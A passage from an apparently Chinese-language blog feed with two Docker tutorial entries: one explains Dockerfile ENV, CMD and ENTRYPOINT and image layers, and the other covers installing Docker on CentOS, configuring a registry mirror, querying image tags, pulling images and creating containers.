type="1"><li>ENV和CMD命令讲解</li></ol><p>Dockfile中的<code>ENV</code>命令的功能相对比较简单。通过该命令我们可以为容器镜像设置环境变量。通过环境变量我们可以将一些配置信息固化在镜像中。</p><p>接下来再来看<code>CMD</code>命令，这个命令用来设置容器的初始化命令。通过此命令我们可以让容器在启动时候执行一条命令，通过这条命令我们可以实现容器启动后，运行一个服务，或者在控制台输出一段文字等功能。此命令的格式为<code>CMD [”参数1“, ”参数2“...]</code>。</p><p>在使用<code>CMD</code>命令是我们需要注意的几点是：</p><ol type="a"><li><p>这条命令虽然可以设置很多次，但是只有最后一次会生效。</p></li><li><p>当我们使用<code>docker run</code>命令启动容器时，我们可以<code>docker run</code>容器镜像名后面加入<code>参数1 参数2..</code>的形式代替容器镜像中原有的<code>CMD</code>命令。</p></li></ol><p>我们创建子目录，并使用<code>vi</code>修改<code>Dockerfile</code>为如下内容。并编辑为如下内容。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mxcr1jlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-mxcr1jlmrh9u69"><pre><code class="hljs shell">cd /mkdir dir6-2vi dir6-2/Dockerfile</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-i08vy2lmrh9u69"></i><span>dockerfile</span><div class="collapse show" id="collapse-i08vy2lmrh9u69"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:latest<span class="hljs-keyword">ENV</span> IMG_STRING img6-<span class="hljs-number">2</span>的环境变量<span class="hljs-comment"># CMD ["echo", "$IMG_STRING"]</span><span class="hljs-keyword">CMD</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$IMG_STRING</span></span></code></pre></div></div><p><strong>注意，在原教程中<code>CMD</code>指令编写有误，上面已经给出了更正</strong>。下面进行简单的<a href="https://yeasy.gitbook.io/docker_practice/image/dockerfile/cmd">解释</a>。</p><blockquote><p>在指令格式上，一般推荐使用 <code>exec</code>格式，这类格式在解析时会被解析为 JSON 数组，因此一定要使用双引号<code>"</code>，而不要使用单引号。</p><p>如果使用 <code>shell</code> 格式的话，实际的命令会被包装为<code>sh -c</code> 的参数的形式进行执行。比如：</p><p><code>CMD echo $IMG_STRING</code></p><p><code>CMD ["sh","-c","echo $IMG_STRING"]</code></p><p>这就是为什么我们可以使用环境变量的原因，因为这些环境变量会被 shell进行解析处理。</p></blockquote><p><code>Dockerfile</code>编写完毕后，使用<code>docker build</code>进行编译。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5bf7talmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-5bf7talmrh9u69"><pre><code class="hljs shell">docker build -t img6-2 dir6-2</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115810025076_444_image-20230905151434617.png" alt="image-20230905151434617"><figcaption aria-hidden="true">image-20230905151434617</figcaption></figure><ol start="2" type="1"><li>CMD和ENTRYPOINT命令讲解</li></ol><p>除了<code>CMD</code>命令之外我们还可以使用<code>ENTRYPOINT</code>命令来实现类似的功能。该命令和<code>CMD</code>命令的格式和功能基本一致，其区别在于<code>docker run</code>命令只能使用<code>--entrypoint</code>参数替换镜像中的<code>ENTRYPOINT</code>设置。</p><p>在编写<code>Dockerfile</code>时，如果<code>ENTRYPOINT</code>和<code>CMD</code>命令同时出现的时候，容器启动时会将两个指令的参数串联起来，以<code>ENTRYPOINT参数1, ENTRYPOINT参数2..., CMD参数1, CMD参数2...</code>的形式执行启动命令。因此在具体使用时，我们一般在<code>ENTRYPOINT</code>中设置初始化命令，在<code>CMD</code>中设置初始化命令的参数。需要注意的是，<code>ENTRYPOINT</code>和<code>CMD</code>命令联合使用的时候，只能使用<code>[”参数1“, ”参数2“...]</code>格式的参数。</p><p>我们创建子目录，并使用<code>vi</code>修改<code>Dockerfile</code>为如下内容。并编辑为如下内容。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vc3pvklmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-vc3pvklmrh9u69"><pre><code class="hljs shell">cd /mkdir dir6-3vi dir6-3/Dockerfile</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bp3ro7lmrh9u69"></i><span>dockerfile</span><div class="collapse show" id="collapse-bp3ro7lmrh9u69"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:latest<span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">"-c"</span>, <span class="hljs-string">"echo CMD作为ENTRYPOINT的参数"</span>]</span><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">"bash"</span>]</span></code></pre></div></div><p>Dockerfile编写完毕后，然后使用docker build编译容器镜像</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8n7h1elmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-8n7h1elmrh9u69"><pre><code class="hljs shell">docker build -t img6-3 dir6-3</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115815811340_658_image-20230905152110713.png" alt="image-20230905152110713"><figcaption aria-hidden="true">image-20230905152110713</figcaption></figure><ol start="3" type="1"><li>验证容器镜像</li></ol><p>我们来验证编译好的<code>img6-2</code>容器镜像，我们通过<code>docker run</code>启动镜像，然后验证容器中的内容。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mhaykllmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-mhaykllmrh9u69"><pre><code class="hljs shell">docker run img6-2docker run img6-2 ls -ll</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115820729711_808_image-20230905153928461.png" alt="image-20230905153928461"><figcaption aria-hidden="true">image-20230905153928461</figcaption></figure><p>接下来我们来验证编译好的img6-3容器镜像，我们通过<code>docker run</code>启动镜像，然后验证容器中的内容。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xi2s0mlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-xi2s0mlmrh9u69"><pre><code class="hljs shell">docker run img6-3docker run --entrypoint echo img6-3 "手动设置ENTRYPOINT和CMD"docker run img6-3 -c "echo 手动设置CMD参数"</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115826074004_456_image-20230905152521488.png" alt="image-20230905152521488"><figcaption aria-hidden="true">image-20230905152521488</figcaption></figure><h3 id="容器镜像的层次关系">容器镜像的层次关系</h3><p>在上一个实验中我们验证了通过<code>docker commit</code>命令生成镜像时，会在原有的镜像层之上添加一个新的层。接下来我们来看一下通过<code>docker build</code>方式生成的镜像的层次结构。</p><ol type="1"><li>查看镜像层次</li></ol><p>我们也用<code>docker inspect</code>命令来查看一下镜像<code>img6-1</code>的层次信息，结果会发现<code>docker build</code>在基础镜像之上构建多个了新的镜像。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115829877225_831_image-20230905154527625.png" alt="image-20230905154527625"><figcaption aria-hidden="true">image-20230905154527625</figcaption></figure><ol start="2" type="1"><li>查看镜像历史</li></ol><p>通过<code>docker build</code>生成的镜像。除了<code>docker inspcet</code>之外，还可以通过<code>docker history</code>命令来查看通过<code>Dockerfile</code>定义的镜像的生成方式。我们可以看到<code>docker history</code>命令输出了镜像构建的过程信息，通过这一信息我们能比较清晰的看到镜像作者在制作镜像时的具体操作。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115833217733_117_image-20230905154617548.png" alt="image-20230905154617548"><figcaption aria-hidden="true">image-20230905154617548</figcaption></figure><ol start="3" type="1"><li>镜像层次和镜像历史之间的关系</li></ol><p>当我们执行上两个步骤的时候，细心的同学可能会发现，<code>docker history</code>中的每一个步骤都会生成一个中间状态的镜像，但是镜像的层数和镜像的步骤并不是严格的一一对应关系。这是因为docker会自动压缩一些没有实际产生数据修改的镜像，将多个临时镜像压缩成一层。比如<code>WORKDIR</code>命令所生成的中间状态。</p><p>同样我们可以比较<code>img6-2</code>和<code>img6-3</code>镜像。我们会发现虽然这两个镜像包含了很多的步骤，但是由于没有实际向镜像中写入文件，因此这两个镜像的存储层实际上和基础镜像ubuntu的存储层保持一致，这就意味着这两个镜像并没有在本地镜像仓库中额外消耗存储控件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ze3swklmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-ze3swklmrh9u69"><pre><code class="hljs shell">docker history img6-2docker inspect -f "{{json .RootFS.Layers}}" img6-2 | jqdocker history img6-3docker inspect -f "{{json .RootFS.Layers}}" img6-3 | jqdocker inspect -f "{{json .RootFS.Layers}}" ubuntu | jq</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115838928038_319_image-20230905154829449.png" alt="image-20230905154829449"><figcaption aria-hidden="true">image-20230905154829449</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入浅出Docker应用-Docker容器入门</title>
    <link href="/posts/41895/"/>
    <url>/posts/41895/</url>
    
    <content type="html"><![CDATA[<h1 id="深入浅出docker应用-docker容器入门">深入浅出docker应用-Docker容器入门</h1><h2 id="写在前面">写在前面</h2><p>本系列教程由<a href="https://developer.aliyun.com/adc/scenarioSeries/713c370e605e4f1fa7be903b80a53556?spm=a2c6h.13788135.J_5170737420.9.61281ff054pM5z">阿里云</a>提供。首先感谢阿里云提供的实验资源。之前空闲时间做过一遍，收获颇丰，可以配得上标称的”深入浅出docker应用“。虽然只是对于基本概念和命令的讲解，现在在图形化界面上也有<code>Docker Desktop</code>方便的管理容器，但是在服务器上进行运维工作，还是需要对命令行的使用方式较为熟悉。由于最近也在深入使用docker，学习其原理，故快速重温一遍，并做转载供平时查阅和分享，以便能通过这些内容对docker有感性的认识。若有侵权，联系2013599@mail.nankai.edu.cn，收到将立即删除。</p><h2 id="docker安装和配置">Docker安装和配置</h2><h3 id="安装">安装</h3><p>Docker是基于Linux内核服务的轻量级开源容器产品，本系列实验我们将为大家介绍docker产品的安装，使用和案例。在本实验中，我们先来介绍docker的安装。在centos系统中，我们一般通过yum进行软件包的安装。因此本次实验我们也通过yum来安装docker运行环境。</p><p>下面是基于实验环境的<code>centos</code>安装过程。其他系统可参见<a href="https://docs.docker.com/engine/install/ubuntu/">官方指导</a></p><ol type="1"><li>安装docker的依赖组件</li></ol><p>在安装docker之前，我们需要先通过yum来安装docker的必要的依赖组件。同时为了编译后面的配置信息格式化输出，我们同时需要安装jq工具。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-w22t5olmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-w22t5olmrh9u69"><pre><code class="hljs shell">yum install -y yum-utils device-mapper-persistent-data lvm2</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-k32uoylmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-k32uoylmrh9u69"><pre><code class="hljs shell">yum install -y jq</code></pre></div></div><ol start="2" type="1"><li>添加Docker的安装来源</li></ol><p>因为docker安装包不在yum的默认源列表中，因此在安装之前我们需要通过yum-config-manager--add-repo命令向yum默认源列表中添加docker源的地址。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0ys1bklmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-0ys1bklmrh9u69"><pre><code class="hljs shell">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</code></pre></div></div><p>源添加成功后，我们可以使用yumlist命令查看当前的docker源中支持的安装包版本列表。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dr4uj9lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-dr4uj9lmrh9u69"><pre><code class="hljs shell">yum list docker-ce --showduplicates | sort -r</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113647495716_679_image-20230904220149946.png" alt="image-20230904220149946"><figcaption aria-hidden="true">image-20230904220149946</figcaption></figure><ol type="1"><li>安装Docker应用</li></ol><p>docker依赖和docker源安装完成之后，我们就可以使用yum installdocker-ce.x86_64命令来安装docker 应用，在使用yuminstall安装时，默认会选择最新的版本进行安装。如果需要指定安装版本也可以在命令后面加入具体的版本号，接下来我们来安装docker的最新版本。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-me0ayjlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-me0ayjlmrh9u69"><pre><code class="hljs shell">yum install -y docker-ce.x86_64</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113649155016_953_image-20230904220307344.png" alt="image-20230904220307344"><figcaption aria-hidden="true">image-20230904220307344</figcaption></figure><p>安装成功之后，我们还需要通过systemctl start命令来启动docker服务</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-j8q9h3lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-j8q9h3lmrh9u69"><pre><code class="hljs shell">systemctl start docker.service</code></pre></div></div><h3 id="配置">配置</h3><p>1.镜像源配置</p><p>通过docker拉取镜像时，默认会通过国外的镜像源进行下载，因此可以配置国内的镜像源以加快下载速度。修改docker的镜像源时，我们使用vi编辑文件<code>/etc/docker/daemon.json</code> 。注意使用vi编辑器时：</p><ol type="1"><li>需要先按i键进入编辑模式。</li><li>编辑完成之后按esc退出编辑模式。</li><li>然后按大写的ZZ保存并退出vi。</li></ol><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zro70clmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-zro70clmrh9u69"><pre><code class="hljs shell">vi /etc/docker/daemon.json</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1on4jglmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-1on4jglmrh9u69"><pre><code class="hljs shell">{   "registry-mirrors":["https://registry.docker-cn.com"]}</code></pre></div></div><p>在编辑成功后，按ECS推出编辑模式，然后按ZZ退出vi。</p><ol start="2" type="1"><li>镜像源修改后，需要重新启动docker服务。</li></ol><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ck0aujlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-ck0aujlmrh9u69"><pre><code class="hljs shell">systemctl restart docker.service</code></pre></div></div><p>服务重启成功后，我们可以通过dockerversion查看docker版本信息。如果出现客户端版本信息和服务版本信息，则说明dcoker已经安装成功且服务已经启动</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-emkxkclmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-emkxkclmrh9u69"><pre><code class="hljs shell">docker version</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113759513071_319_image-20230904220736850.png" alt="image-20230904220736850"><figcaption aria-hidden="true">image-20230904220736850</figcaption></figure><ol start="3" type="1"><li>服务启动之后，为了防止计算机重启之后docker服务被关闭，我们还可以通过systemctlenable命令将docker服务配置为开机自启动。（此步骤为可选操作）</li></ol><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0rwgmjlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-0rwgmjlmrh9u69"><pre><code class="hljs shell">systemctl enable docker.service</code></pre></div></div><h3 id="快速上手">快速上手</h3><p>在前面的小节中我们介绍了Docker的安装的配置，接下来为大家介绍一些Docker的快速上手命令和用法。</p><ol type="1"><li>启动hello-world</li></ol><p>Docker安装配置成功之后，我们就可以通过<code>docker run</code>命令启动轻量级的容器虚拟机。我们执行如下命令</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jfnihflmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-jfnihflmrh9u69"><pre><code class="hljs shell">docker run hello-world</code></pre></div></div><p>会发现屏幕上输出了Hello fromDocker!信息。这个信息输出表示hello-world容器虚拟机启动成功。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113803659205_241_image-20230904220824468.png" alt="image-20230904220824468"><figcaption aria-hidden="true">image-20230904220824468</figcaption></figure><ol start="2" type="1"><li>启动长期运行的bash容器</li></ol><p>在上一个步骤中，我们演示了docker最基本的用法，这种方式启动的<code>hello-world</code>容器，在启动之后会输出文字，在输出之后容器就会结束。</p><p>接下来我们来启动一个可以长期运行的bash容器。我们在命令行中输入如下命令，运行成功后会看到命令提示行变为bash，这表示容器虚拟机已经持续运行。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kq0kamlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-kq0kamlmrh9u69"><pre><code class="hljs shell">docker run -it bash</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113808950713_810_image-20230904220909280.png" alt="image-20230904220909280"><figcaption aria-hidden="true">image-20230904220909280</figcaption></figure><ol start="3" type="1"><li>bash容器的退出</li></ol><p>在运行的bash容器中我们可以使用一些基本的linux命令，如pwd，ls等</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-n9cbtclmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-n9cbtclmrh9u69"><pre><code class="hljs shell">pwdls</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113813340599_640_image-20230904221015298.png" alt="image-20230904221015298"><figcaption aria-hidden="true">image-20230904221015298</figcaption></figure><p>如果希望退出bash容器，回到宿主机，我们在控制台中输入exit命令即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wae2ywlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-wae2ywlmrh9u69"><pre><code class="hljs shell">exit</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113818586520_163_image-20230904221027326.png" alt="image-20230904221027326"><figcaption aria-hidden="true">image-20230904221027326</figcaption></figure><p>在使用dockerrun命令运行容器时，我们会看到在容器运行之前，出现了Status: Downloadednewerimage状态。这表示在容器虚拟机第一次运行时，会首先从远程容器源服务器中下载镜像到本地，然后才能在本地运行。</p><p>在本小节中，我们来学习如何分步骤从镜像源查找所需要的容器镜像，然后再来了解如何下载容器镜像，并且查看本地已经下载好的容器镜像列表。</p><ol type="1"><li>远程查找容器</li></ol><p>当我们需要查找容器时，可以通过dockersearch命令在的镜像源中查找所需要的容器镜像。接下来我们来查找ubuntu容器。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-a22pntlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-a22pntlmrh9u69"><pre><code class="hljs shell">docker search ubuntu</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113823028609_871_image-20230904221056674.png" alt="image-20230904221056674"><figcaption aria-hidden="true">image-20230904221056674</figcaption></figure><ol type="1"><li>查找容器的版本信息</li></ol><p>在找到所需要的容器镜像的名称之后，通常需要进一步在docker的镜像源中查找该镜像的版本列表。由于docker本身没有直接提供查看版本的功能，因此在这里我们为大家提供了一个可以查看镜像版本的简单脚本<code>docker-tags</code>。我们生成docker-tags脚本并加入以下内容，</p><p>注意使用vi编辑器时：</p><ol type="1"><li>需要先按i键进入编辑模式。</li><li>编辑完成之后按esc退出编辑模式。</li><li>然后按大写的ZZ保存并退出vi。</li></ol><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-iipekhlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-iipekhlmrh9u69"><pre><code class="hljs shell">vi docker-tags</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6dnf2hlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-6dnf2hlmrh9u69"><pre><code class="hljs shell">curl -s -S "https://registry.hub.docker.com/v2/repositories/library/$1/tags/?page=$2" |sed -e 's/,/\n/g' -e 's/\[/\\\[\n/g' |grep -E '"name":|"count":' |sed -e 's/"//g' -e "s/name:/$1:/g" -e "s/{count:/$1总版本数-/"</code></pre></div></div><p>docker-tags脚本编辑好之后，需要通过chmod修改文件权限才可以执行。在权限修改完成之后，就可以使用docker-tags脚本来查询相关镜像的最近版本信息了。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-err18clmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-err18clmrh9u69"><pre><code class="hljs shell">chmod 777 docker-tags ./docker-tags ubuntu</code></pre></div></div><ol type="1"><li>拉取容器镜像</li></ol><p>当我们查找到镜像的版本信息之后，就可以拉取镜像到本地了。在拉取镜像时我们可指定拉取镜像的版本，也可不指定版本默认拉取最新版本。首先我们使用dockerpull命令来拉取ubuntu容器的jammy版本。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-u9ul6glmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-u9ul6glmrh9u69"><pre><code class="hljs shell">docker pull ubuntu:jammy</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113826463659_596_image-20230904221220297.png" alt="image-20230904221220297"><figcaption aria-hidden="true">image-20230904221220297</figcaption></figure><p>接下来我们来拉取ubuntu的最新版本。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jajv37lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-jajv37lmrh9u69"><pre><code class="hljs shell">docker pull ubuntu</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113831522600_650_image-20230904221246435.png" alt="image-20230904221246435"><figcaption aria-hidden="true">image-20230904221246435</figcaption></figure><p>当镜像源已经拉取到本地之后，我们可以通过dockerimages命令来查看已经拉取到的本地镜像。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-clfx0jlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-clfx0jlmrh9u69"><pre><code class="hljs shell">docker images</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113834482846_648_image-20230904221300207.png" alt="image-20230904221300207"><figcaption aria-hidden="true">image-20230904221300207</figcaption></figure><h2 id="容器启动和操作">容器启动和操作</h2><p>镜像拉取到本地之后并不能直接运行，如果要启动容器，我们需要首先根据镜像创建容器。接下来我们将学习如何创建容器并启动ubuntu容器。</p><h3 id="容器的分步骤启动流程">容器的分步骤启动流程</h3><ol type="1"><li>创建ubuntu容器</li></ol><p>我们可以使用dockercreate命令，利用下载好的ubuntu镜像创建容器。注意：因为我们要创建一个可以持久运行的ubuntu容器，因此需要添加-it参数。</p><p><code>-i</code>：这个参数代表“交互式（Interactive）”。它使容器的标准输入（stdin）保持打开状态，允许你与容器的命令行交互。这意味着你可以在容器内部执行命令，并从键盘输入内容，就像在本地计算机上的终端一样。</p><p><code>-t</code>：这个参数代表“终端（TTY）”。它为容器分配了一个伪终端（pseudo-TTY），这使得容器内的命令行界面可以正常工作，包括支持终端窗口大小的调整和ANSI转义序列的处理。这通常与<code>-i</code>一起使用，以确保交互式终端在容器内部能够正常运行。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-79nfn1lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-79nfn1lmrh9u69"><pre><code class="hljs shell">docker create -it ubuntu</code></pre></div></div><p>容器创建成功之后，可以使用<code>docker ps</code>命令查看现有的容器，注意：如果dockerps默认只会显示正在运行的容器。如果想查看所有状态的容器，需要添加-a参数。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-o2o1zflmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-o2o1zflmrh9u69"><pre><code class="hljs shell">docker ps -a</code></pre></div></div><p>注：换了一个服务器，因此只显示了一个</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113838384667_198_image-20230904222052915.png" alt="image-20230904222052915"><figcaption aria-hidden="true">image-20230904222052915</figcaption></figure><ol start="2" type="1"><li>创建指定名称的容器</li></ol><p>在上一步的执行docker ps -a的返回结果中。CONTAINERID表示系统为容器创建的ID，IMAGE为容器的镜像名称。STATUS表示容器当前的状态。NAMES为容器的名称。</p><p>使用默认的dockercreate命令所创建的容器并没有指定名称，因此docker会为容器生成一个随机的名字。如果用户想创建指定名称的容器，则可以使用<code>--name</code>参数。注意如果用户制定了容器名，则要注意容器不要重名，否则会创建失败。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lsfj87lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-lsfj87lmrh9u69"><pre><code class="hljs shell">docker create -it --name ubuntu-1 ubuntudocker ps -a</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E5%85%A5%E9%97%A8/20230906113842660170_765_image-20230904222138404.png" alt="image-20230904222138404"><figcaption aria-hidden="true">image-20230904222138404</figcaption></figure><ol start="3" 